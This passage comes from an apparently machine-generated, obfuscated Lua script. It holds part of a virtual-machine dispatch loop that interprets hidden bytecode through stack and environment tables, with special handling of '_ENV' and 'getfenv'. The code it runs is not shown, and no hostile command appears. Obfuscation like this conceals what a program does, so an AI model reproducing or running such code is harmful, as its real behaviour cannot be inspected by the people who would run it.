              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = {};
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
            end
          elseif (Enum == 198) then
            local B;
            local A;
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
          else
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          end
        elseif (Enum <= 299) then
          if (Enum <= 249) then
            if (Enum <= 224) then
              if (Enum <= 211) then
                if (Enum <= 205) then
                  if (Enum <= 202) then
                    if (Enum <= 200) then
                      local B;
                      local A;
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3] ~= 0;
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    elseif (Enum == 201) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    else
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Env[Inst[3]] = Stk[Inst[2]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                    end
                  elseif (Enum <= 203) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 204) then
                    Stk[Inst[2]]();
                  else
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 208) then
                  if (Enum <= 206) then
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Env[Inst[3]] = Stk[Inst[2]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                  elseif (Enum == 207) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 209) then
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum == 210) then
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 217) then
                if (Enum <= 214) then
                  if (Enum <= 212) then
                    local A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  elseif (Enum == 213) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = {};
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local B;
                    local A;
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  end
                elseif (Enum <= 215) then
                  local Results;
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Stk[A + 1]));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                  Edx = 0;
                  for Idx = A, Inst[4] do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  VIP = Inst[3];
                elseif (Enum > 216) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 220) then
                if (Enum <= 218) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum == 219) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
